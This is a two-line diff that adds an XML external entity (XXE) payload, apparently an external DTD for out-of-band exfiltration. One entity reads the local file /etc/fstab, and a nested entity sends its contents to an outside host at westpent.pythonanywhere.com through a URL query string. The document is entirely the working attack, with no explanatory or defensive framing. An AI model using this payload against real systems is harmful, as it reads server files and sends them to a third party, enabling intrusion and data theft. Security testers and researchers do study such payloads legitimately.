@@ -1,0 +1,2 @@
+<!ENTITY % payl SYSTEM "file:///etc/fstab">
+<!ENTITY % intern "<!ENTITY &#x25; xxe SYSTEM 'http://westpent.pythonanywhere.com/K?%payl;'>">
